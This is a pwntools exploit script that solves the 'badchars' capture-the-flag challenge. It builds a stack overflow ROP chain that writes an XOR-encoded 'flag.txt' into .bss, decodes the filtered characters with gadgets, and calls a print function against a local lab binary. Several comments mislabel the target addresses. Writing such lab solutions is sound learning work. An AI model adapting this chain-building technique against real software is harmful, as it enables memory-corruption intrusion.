#!/usr/bin/python3

from pwn import *
import time

"""
'x', 'a', 'g', '.' are the badchars

For reasons unknown to me and not worth exploring at the time, so that section is removed.

The goal here is to write "flag.txt" to .bss in such a way that we can avoid bad chars and XOR
them to their appropriate value later.
"""
bin_file = "./badchars"         # Binary for the challenge

print_file_func = p64(0x400510) # Print function we need to print the flag
bss0 =            p64(0x601038) # start off bss (byte 0)
bss1 =            p64(0x601039) # byte 1...
bss2 =            p64(0x60103a) # 2
bss3 =            p64(0x60103b) # 3
bss4 =            p64(0x60103c) # 4
bss5 =            p64(0x60103d) # 5
bss6 =            p64(0x60103e) # 6
bss7 =            p64(0x60103f) # 7

pop_r12_r13_r14_r15 =     p64(0x40069c)
pop_rdi =                 p64(0x4006a3)
mov_r12_to_r13m =         p64(0x400634)
xor_r14b_to_r15m =        p64(0x400628)

val_to_xor = p64(0x0000001b)
flag_txt =   b'flz|5tct' # I chose '1b' as the XOR value randomly, so these are the appropriate chars XOR-ed by that
nulls =      p64(0x00000000) # Always have nulls just in case

offset = 40 # Having an issue with pwntools on this chal, so I just added the offset manually

payload = b"V"*offset # Add offset

"""
The following is extra verbose for code-clarity. There are simpler ways to write this. Also, I didn't
hunt for a gadget that didn't pop 4 registers, so there's that too
"""
# Replace 'z' with 'a'
val_to_write_to_r12 = flag_txt
val_to_write_to_r13 = bss0
val_to_write_to_r14 = val_to_xor
val_to_write_to_r15 = bss2
payload += pop_r12_r13_r14_r15
payload += val_to_write_to_r12 # flag.txt
payload += val_to_write_to_r13 # bss address
payload += val_to_write_to_r14 # 0x1b
payload += val_to_write_to_r15 # bss2 address
payload += mov_r12_to_r13m # move flz|5tct to bss value
payload += xor_r14b_to_r15m # xor last byte of r14 to r15m

# Replace '|' with 'g'
val_to_write_to_r12 = nulls
val_to_write_to_r13 = nulls
val_to_write_to_r14 = val_to_xor
val_to_write_to_r15 = bss3
payload += pop_r12_r13_r14_r15
payload += val_to_write_to_r12 # flag.txt
payload += val_to_write_to_r13 # bss address
payload += val_to_write_to_r14 # 0x1b
payload += val_to_write_to_r15 # bss2 address
payload += xor_r14b_to_r15m # xor last byte of r14 to r15m

# Replace '5' with '.'
payload += pop_r12_r13_r14_r15
val_to_write_to_r12 = nulls
val_to_write_to_r13 = nulls
val_to_write_to_r14 = val_to_xor
val_to_write_to_r15 = bss4
payload += val_to_write_to_r12 # null
payload += val_to_write_to_r13 # null
payload += val_to_write_to_r14 # 0x1b
payload += val_to_write_to_r15 # bss2 address
payload += xor_r14b_to_r15m # xor last byte of r14 to r15m

# Replace 'c' with 'x'
payload += pop_r12_r13_r14_r15
val_to_write_to_r12 = nulls
val_to_write_to_r13 = nulls
val_to_write_to_r14 = val_to_xor
val_to_write_to_r15 = bss6
payload += val_to_write_to_r12 # null
payload += val_to_write_to_r13 # null
payload += val_to_write_to_r14 # 0x1b
payload += val_to_write_to_r15 # bss2 address
payload += xor_r14b_to_r15m # xor last byte of r14 to r15m

# Call print function with bss base addr
payload += pop_rdi
payload += bss0
payload += print_file_func

# Write the payload to a file so we can use it with GDB if needed
with open('payload.txt', 'wb') as file:
  file.write(payload)

# Proof of exploit
p = process(bin_file)
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
p.sendline(payload)
print(p.readline())
print(p.readline())
p.close()
